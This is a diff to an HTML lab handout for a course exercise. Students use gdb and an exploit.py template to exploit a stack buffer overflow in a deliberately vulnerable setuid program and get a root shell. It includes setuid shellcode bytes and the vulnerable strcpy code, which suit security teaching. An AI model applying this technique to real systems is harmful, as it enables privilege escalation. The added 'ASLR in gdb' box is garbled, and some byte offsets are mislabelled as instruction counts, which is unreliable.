@@ -257,6 +257,8 @@ shellcode</a></li>
 <li><a href="#compilation">3.1. Compilation</a></li>
 <li><a href="#launching-an-attack-on-a-32-bit-program">3.2. Launching an
 attack on a 32-bit program</a></li>
+<li><a href="#hints-on-inserting-your-shellcode">3.3. Hints on inserting
+your shellcode</a></li>
 </ul></li>
 </ul>
 </nav>
@@ -518,7 +520,7 @@ look at <code>call_shellcode.c</code> (reproduced below):</p>
 <span id="cb11-2"><a href="#cb11-2"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
 <span id="cb11-3"><a href="#cb11-3"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
 <span id="cb11-4"><a href="#cb11-4"></a></span>
-<span id="cb11-5"><a href="#cb11-5"></a><span class="co">// Binary code for setuid(0) </span></span>
+<span id="cb11-5"><a href="#cb11-5"></a><span class="co">// Binary code for setuid(0)</span></span>
 <span id="cb11-6"><a href="#cb11-6"></a><span class="co">// 64-bit:  &quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;</span></span>
 <span id="cb11-7"><a href="#cb11-7"></a><span class="co">// 32-bit:  &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80&quot;</span></span>
 <span id="cb11-8"><a href="#cb11-8"></a></span>
@@ -596,7 +598,7 @@ omitted):</p>
 <span id="cb12-10"><a href="#cb12-10"></a><span class="dt">int</span> bof<span class="op">(</span><span class="dt">char</span> <span class="op">*</span>str<span class="op">)</span> <span class="op">{</span></span>
 <span id="cb12-11"><a href="#cb12-11"></a>    <span class="dt">char</span> buffer<span class="op">[</span>BUF_SIZE<span class="op">];</span></span>
 <span id="cb12-12"><a href="#cb12-12"></a></span>
-<span id="cb12-13"><a href="#cb12-13"></a>    <span class="co">// The following statement has a buffer overflow problem </span></span>
+<span id="cb12-13"><a href="#cb12-13"></a>    <span class="co">// The following statement has a buffer overflow problem</span></span>
 <span id="cb12-14"><a href="#cb12-14"></a>    strcpy<span class="op">(</span>buffer<span class="op">,</span> str<span class="op">);</span></span>
 <span id="cb12-15"><a href="#cb12-15"></a></span>
 <span id="cb12-16"><a href="#cb12-16"></a>    <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
@@ -606,7 +608,7 @@ omitted):</p>
 <span id="cb12-20"><a href="#cb12-20"></a>    <span class="dt">char</span> str<span class="op">[</span><span class="dv">517</span><span class="op">];</span></span>
 <span id="cb12-21"><a href="#cb12-21"></a>    <span class="dt">FILE</span> <span class="op">*</span>badfile<span class="op">;</span></span>
 <span id="cb12-22"><a href="#cb12-22"></a></span>
-<span id="cb12-23"><a href="#cb12-23"></a>    badfile <span class="op">=</span> fopen<span class="op">(</span><span class="st">&quot;badfile&quot;</span><span class="op">,</span> <span class="st">&quot;r&quot;</span><span class="op">);</span> </span>
+<span id="cb12-23"><a href="#cb12-23"></a>    badfile <span class="op">=</span> fopen<span class="op">(</span><span class="st">&quot;badfile&quot;</span><span class="op">,</span> <span class="st">&quot;r&quot;</span><span class="op">);</span></span>
 <span id="cb12-24"><a href="#cb12-24"></a>    <span class="cf">if</span> <span class="op">(!</span>badfile<span class="op">)</span> <span class="op">{</span></span>
 <span id="cb12-25"><a href="#cb12-25"></a>       perror<span class="op">(</span><span class="st">&quot;Opening badfile&quot;</span><span class="op">);</span> exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
 <span id="cb12-26"><a href="#cb12-26"></a>    <span class="op">}</span></span>
@@ -664,8 +666,17 @@ so debugging information is added to the binary. If you run
 file called <code>badfile</code> before running the program.</p>
 <pre><code>$ touch badfile # Create an empty badfile
 $ gdb stack-L1-dbg # start gdb</code></pre>
+<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
+<p><strong>ASLR in <code>gdb</code></strong></p>
+<p>When you run</p>
+<p>If you’re interested in further details on programming in x86
+assembly, this <a href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html">guide</a>
+from the University of Virginia gives more details, such as how the
+<code>push</code> instruction works with the hardware-supported call
+stack.</p>
+</div>
 <p>Within gdb, run the commands:</p>
-<pre><code>gdb$ b bof 
+<pre><code>gdb$ b bof
 gdb$ run
 gdb$ next
 gdb$ print $ebp
@@ -701,25 +712,25 @@ essential values in the code:</p>
 <span id="cb16-3"><a href="#cb16-3"></a></span>
 <span id="cb16-4"><a href="#cb16-4"></a><span class="co"># Replace the content with the actual shellcode</span></span>
 <span id="cb16-5"><a href="#cb16-5"></a>shellcode<span class="op">=</span> (</span>
-<span id="cb16-6"><a href="#cb16-6"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span>  </span>
-<span id="cb16-7"><a href="#cb16-7"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span>  </span>
+<span id="cb16-6"><a href="#cb16-6"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span></span>
+<span id="cb16-7"><a href="#cb16-7"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span></span>
 <span id="cb16-8"><a href="#cb16-8"></a>).encode(<span class="st">&#39;latin-1&#39;</span>)</span>
 <span id="cb16-9"><a href="#cb16-9"></a></span>
 <span id="cb16-10"><a href="#cb16-10"></a><span class="co"># Fill the content with NOP&#39;s</span></span>
-<span id="cb16-11"><a href="#cb16-11"></a>content <span class="op">=</span> <span class="bu">bytearray</span>(<span class="bn">0x90</span> <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">517</span>)) </span>
+<span id="cb16-11"><a href="#cb16-11"></a>content <span class="op">=</span> <span class="bu">bytearray</span>(<span class="bn">0x90</span> <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">517</span>))</span>
 <span id="cb16-12"><a href="#cb16-12"></a></span>
 <span id="cb16-13"><a href="#cb16-13"></a><span class="co">##################################################################</span></span>
 <span id="cb16-14"><a href="#cb16-14"></a><span class="co"># Put the shellcode somewhere in the payload</span></span>
-<span id="cb16-15"><a href="#cb16-15"></a>start <span class="op">=</span> <span class="dv">0</span>               <span class="co"># Change this number </span></span>
+<span id="cb16-15"><a href="#cb16-15"></a>start <span class="op">=</span> <span class="dv">0</span>               <span class="co"># Change this number</span></span>
 <span id="cb16-16"><a href="#cb16-16"></a>content[start:start <span class="op">+</span> <span class="bu">len</span>(shellcode)] <span class="op">=</span> shellcode</span>
 <span id="cb16-17"><a href="#cb16-17"></a></span>
-<span id="cb16-18"><a href="#cb16-18"></a><span class="co"># Decide the return address value </span></span>
+<span id="cb16-18"><a href="#cb16-18"></a><span class="co"># Decide the return address value</span></span>
 <span id="cb16-19"><a href="#cb16-19"></a><span class="co"># and put it somewhere in the payload</span></span>
-<span id="cb16-20"><a href="#cb16-20"></a>ret    <span class="op">=</span> <span class="bn">0x00</span>           <span class="co"># Change this number </span></span>
-<span id="cb16-21"><a href="#cb16-21"></a>offset <span class="op">=</span> <span class="dv">0</span>              <span class="co"># Change this number </span></span>
+<span id="cb16-20"><a href="#cb16-20"></a>ret    <span class="op">=</span> <span class="bn">0x00</span>           <span class="co"># Change this number</span></span>
+<span id="cb16-21"><a href="#cb16-21"></a>offset <span class="op">=</span> <span class="dv">0</span>              <span class="co"># Change this number</span></span>
 <span id="cb16-22"><a href="#cb16-22"></a></span>
 <span id="cb16-23"><a href="#cb16-23"></a>L <span class="op">=</span> <span class="dv">4</span>     <span class="co"># Use 4 for 32-bit address and 8 for 64-bit address</span></span>
-<span id="cb16-24"><a href="#cb16-24"></a>content[offset:offset <span class="op">+</span> L] <span class="op">=</span> (ret).to_bytes(L,byteorder<span class="op">=</span><span class="st">&#39;little&#39;</span>) </span>
+<span id="cb16-24"><a href="#cb16-24"></a>content[offset:offset <span class="op">+</span> L] <span class="op">=</span> (ret).to_bytes(L,byteorder<span class="op">=</span><span class="st">&#39;little&#39;</span>)</span>
 <span id="cb16-25"><a href="#cb16-25"></a><span class="co">##################################################################</span></span>
 <span id="cb16-26"><a href="#cb16-26"></a></span>
 <span id="cb16-27"><a href="#cb16-27"></a><span class="co"># Write the content to a file</span></span>
@@ -747,7 +758,199 @@ root shell:</p>
 $ ./stack-L1   # launch the attack by running the vulnerable program
 # &lt;---- Bingo! You’ve got a root shell!</code></pre>
 <p>Try running the command <code>id</code> to confirm you are root.</p>
+<h3 id="hints-on-inserting-your-shellcode">3.3. Hints on inserting your
+shellcode</h3>
+<p>It can be helpful to try and orient yourself while using
+<code>gdb</code>, and work out where different parts of the stack are.
+In this section, we show some commands you can run to find their
+locations.</p>
+<p>While you have the <code>stack-L1-dbg</code> program stopped at a
+breakpoint in <code>gdb</code>, open another terminal session and
+<code>ssh</code> into the VM so you can run
+<code>ps -af | grep stack-L1-dbg</code>.</p>
+<p>You should see something like the following:</p>
+<pre><code>$ ps -af | grep stack-L1-dbg
+vagrant     1355    1340  0 02:43 pts/1    00:00:00 gdb ./stack-L1-dbg
+vagrant     1357    1355  0 02:43 pts/1    00:00:00 /home/vagrant/lab04-code/code/stack-L1-dbg
+vagrant     1362    1246  0 02:44 pts/0    00:00:00 grep --color=auto stack-L1-dbg</code></pre>
+<p>Here, the second line shows the (currently stopped)
+<code>stack-L1-dbg</code> process; the second column is the <em>process
+ID</em>. If you run <code>cat /proc/<em>process_id</em>/maps</code>
+(replacing <em>process_id</em> with the process ID of the
+<code>stack-L1-dbg</code> process), you should get output like the
+following:</p>
+<pre><code>56555000-56558000 r-xp 00000000 fc:03 393228                             /home/vagrant/lab04-code/code/stack-L1-dbg
+56558000-56559000 r-xp 00002000 fc:03 393228                             /home/vagrant/lab04-code/code/stack-L1-dbg
+56559000-5655a000 rwxp 00003000 fc:03 393228                             /home/vagrant/lab04-code/code/stack-L1-dbg
+5655a000-5657c000 rwxp 00000000 00:00 0                                  [heap]
+f7dd5000-f7fba000 r-xp 00000000 fc:03 1847105                            /usr/lib32/libc-2.31.so
+f7fba000-f7fbb000 ---p 001e5000 fc:03 1847105                            /usr/lib32/libc-2.31.so
+f7fbb000-f7fbd000 r-xp 001e5000 fc:03 1847105                            /usr/lib32/libc-2.31.so
+f7fbd000-f7fbe000 rwxp 001e7000 fc:03 1847105                            /usr/lib32/libc-2.31.so
+f7fbe000-f7fc1000 rwxp 00000000 00:00 0
+f7fcb000-f7fcd000 rwxp 00000000 00:00 0
+f7fcd000-f7fd0000 r--p 00000000 00:00 0                                  [vvar]
+f7fd0000-f7fd1000 r-xp 00000000 00:00 0                                  [vdso]
+f7fd1000-f7ffb000 r-xp 00000000 fc:03 1847101                            /usr/lib32/ld-2.31.so
+f7ffc000-f7ffd000 r-xp 0002a000 fc:03 1847101                            /usr/lib32/ld-2.31.so
+f7ffd000-f7ffe000 rwxp 0002b000 fc:03 1847101                            /usr/lib32/ld-2.31.so
+fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]</code></pre>
+<p>This gives you a picture of the process’s virtual memory – memory
+addresses are in the leftmost column. The actual program instructions of
+<code>stack-L1-dbg</code> – the “text segment” – are in the addresses
+<code>0x56555000</code> to <code>0x5655a000</code> (the top few lines).
+Back in <code>gdb</code>, if you ask for the memory address of the
+instructions of the <code>main</code> routine, you should get an address
+in that range:</p>
+<pre><code>(gdb) print main
+$1 = {int (int, char **)} 0x565562e0 &lt;main&gt;</code></pre>
+<p>The <em>stack</em> is in the range of addresses from
+<code>0xfffdd000</code> to <code>0xffffe000</code>.</p>
+<p>If we’re stopped somewhere in the <code>bof</code> function, then if
+we issue the <code>backtrace</code> command, we can get some basic
+information about the stack frames currently on the stack:</p>
+<pre><code>(gdb) backtrace
+#0  bof (str=0xffffd2e3 &quot;\n\212\027\377\367\bRUV\001&quot;) at stack.c:17
+#1  0x565563ee in dummy_function (str=0xffffd2e3 &quot;\n\212\027\377\367\bRUV\001&quot;) at stack.c:46
+#2  0x56556382 in main (argc=1, argv=0xffffd5a4) at stack.c:34</code></pre>
+<p>This says there are 3 stack frames on the stack. Stack frame #2
+represents our position in the <code>main</code> function. We’ve just
+executed an instruction sitting at location <code>0x56556382</code> in
+memory,<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a> which corresponds to
+<code>stack.c</code> line 34 (i.e., the call to
+<code>dummy_function(str)</code>).</p>
+<p>Similarly, stack frame #1 represents our position in
+<code>dummy_function</code>, and stack frame #0 is the current stack
+frame.</p>
+<p>We can get more information about a stack frame using the
+<code>info frame</code> command. For instance, issuing the gdb command
+<code>info frame 0</code> should result in output like the
+following:</p>
+<pre><code>(gdb) info frame 0
+Stack frame at 0xffffcec0:
+ eip = 0x565562c2 in bof (stack.c:17); saved eip = 0x565563ee
+ called by frame at 0xffffd2d0
+ source language c.
+ Arglist at 0xffffce3c, args: str=0xffffd2e3 &quot;\n\212\027\377\367\bRUV\001&quot;
+ Locals at 0xffffce3c, Previous frame&#39;s sp is 0xffffcec0
+ Saved registers:
+  ebx at 0xffffceb4, ebp at 0xffffceb8, eip at 0xffffcebc</code></pre>
+<p>This tells us:</p>
+<ul>
+<li><p>Looking at the first line of output,
+<code>Stack frame at 0xffffcec0</code>:</p>
+<p>The current stack frame, for <code>bof</code>, is at location
+<code>0xffffcec0</code>. (The stack frames for
+<code>dummy_function</code> and <code>main</code>, if we inspect them,
+will be at higher addresses in memory. Recall that the stack grows from
+<em>high</em> memory addresses to <em>low</em> ones.)</p></li>
+<li><p>Looking at the second line of output,
+<code>eip = 0x565562c2 in bof   (stack.c:17); saved eip = 0x565563ee</code>:</p>
+<p>This tells us about the value of the <code>eip</code> register. On
+Intel processors, this is the “Extended Instruction Pointer” register –
+it keeps track of what instruction is currently being executed.</p>
+<p><code>eip = 0x565562c2 in bof (stack.c:17)</code> tells us that we’re
+currently executing the instruction at location <code>0x565562c2</code>
+in memory, and that it corresponds to <code>stack.c</code> line 17.</p>
+<p><code>saved eip = 0x565563ee</code> tells us about the bit of the
+stack frame that says what code to execute after the current function
+returns. Presently, the stack frame is going to return to location
+<code>0x565563ee</code> – the spot in <code>dummy_function</code> where
+we’ve just executed the call to <code>bof()</code>.</p></li>
+<li><p>Looking at the last line of output,
+<code>eip at 0xffffcebc</code>:</p>
+<p>This tells us the location we need to overwrite, if we want to jump
+to somewhere <em>other</em> than <code>dummy_function</code>.</p>
+<p>Memory location <code>0xffffcebc</code> is the part of the current
+stack frame which stores the “next instruction to execute” after
+<code>bof</code> returns.</p></li>
+</ul>
+<p>Let’s examine the Instruction Pointer a little. Make sure you’re
+stopped in the middle of the <code>bof</code> function: issue the gdb
+commands <code>run</code> (this will ask you if you want to restart the
+program; answer yes) and <code>next</code> to get there.</p>
+<p>Issue the gdb comman <code>print $eip</code> to show the current
+value of the Instruction Pointer, and you should see something like the
+following:</p>
+<pre><code>(gdb) print $eip
+$8 = (void (*)()) 0x565562c2 &lt;bof+21&gt;</code></pre>
+<p>What does this mean?</p>
+<ul>
+<li><code>(void (*)())</code> says that we should think of the
+<code>eip</code> register as holding a pointer to a function taking no
+arguments and returning void.</li>
+<li><code>0x565562c2</code> is the location in memory of the address
+currently being executed.</li>
+<li><code>&lt;bof+21&gt;</code> says it’s 21 instructions past the start
+of <code>bof</code>. (If you like, you can confirm this by issuing the
+gdb command <code>print   bof</code> – that will tell you where the
+<em>first</em> instruction in <code>bof</code> is located – and checking
+that it’s equal to <em>address_in_eip</em> <span class="math inline">−</span> 21.</li>
+</ul>
+<p>Now let’s do the same for the <em>saved</em> <code>eip</code>. We
+know it’s stored in memory location <code>0x565563ee</code>. Let’s
+confirm that it <em>currently</em> points to a spot in
+<code>dummy_function</code>, so we issue the gdb command
+<code>print (void (*)()) 0x565563ee</code>. In other words: tell gdb to
+assume that memory location <code>0x565563ee</code> contains a function
+pointer. Your output should be something like:</p>
+<pre><code>(gdb) print (void (*)()) 0x565563ee
+$10 = (void (*)()) 0x565563ee &lt;dummy_function+62&gt;</code></pre>
+<p>This confirms that the saved <code>eip</code> register does indeed
+say that once the current function has finished executing, we’re to jump
+back into somewhere in <code>dummy_function</code> (specifically, the
+62nd instruction after the start of the function).</p>
+<p>So, how can we overwrite the saved <code>eip</code>? We’ll need to
+know</p>
+<ol type="a">
+<li>where the <code>buffer[BUF_SIZE]</code> local variable is sitting in
+memory. This is where the contents of <code>badfile</code> will get
+written.</li>
+<li>how far past that location the saved <code>eip</code> is. If we
+adjust the contents of <code>badfile</code> carefully, we should be able
+to overwrite the saved <code>eip</code> with the address of some other
+function.</li>
+</ol>
+<p>We can get item (a) by issuing the command
+<code>print &amp;buffer</code>. The output should be something like:</p>
+<pre><code>(gdb) print &amp;buffer
+$12 = (char (*)[100]) 0xffffce4c</code></pre>
+<p>So the address of the saved <code>eip</code>, minus the address of
+<code>buffer</code>, tells us the spot in <code>badfile</code> that
+should contain the address of our malicious shellcode.</p>
+<p>To start with, you might want to focus on overwriting the saved
+<code>eip</code> with a function of your choosing and get that working,
+before trying to force execution of your shellcode.</p>
+<p>For instance, can you overwrite the saved <code>eip</code> so that
+when the <code>bof</code> function finishes, execution will – instead of
+jumping to instruction <code>&lt;bof+21&gt;</code> – jump to the start
+of <code>bof</code> again, or the start of <code>dummy_function</code>?
+In <code>exploit.py</code>, change the value of <code>ret</code> to the
+location of the function you want to jump to, and change
+<code>offset</code> to the distance between <code>buffer</code> and the
+saved <code>eip</code>. You can then use <code>gdb</code> to step
+through execution of <code>stack-L1-dbg</code> and confirm whether this
+worked.</p>
+<p>Then, try to get your shellcode executed. In <code>exploit.py</code>,
+change the value of <code>shellcode</code> so that it holds the
+shellcode instructions to execute. You’ll then need to decide where in
+<code>buffer</code> your shellcode should be inserted (leaving it at 0
+to start with is fine); work out what the start address of your
+shellcode is going to be; and ensure that <code>ret</code> contains that
+address.</p>
 <!-- vim: syntax=markdown tw=72 :
 -->
+<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
+<hr />
+<ol>
+<li id="fn1" role="doc-endnote"><p>A little math tells us that
+(<em>location_in_main</em> <span class="math inline">−</span>
+<em>start_of_main</em>) = <span class="math inline">(0<em>x</em>56556382−0<em>x</em>565562<em>e</em>0)</span>
+= 162; we’re 162 instructions past the start of the <code>main</code>
+function. If we wanted, we could view the precise assembly language
+instructions being executed, by issuing the gdb command
+<code>layout asm</code>.<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+</ol>
+</section>
 </body>
 </html>
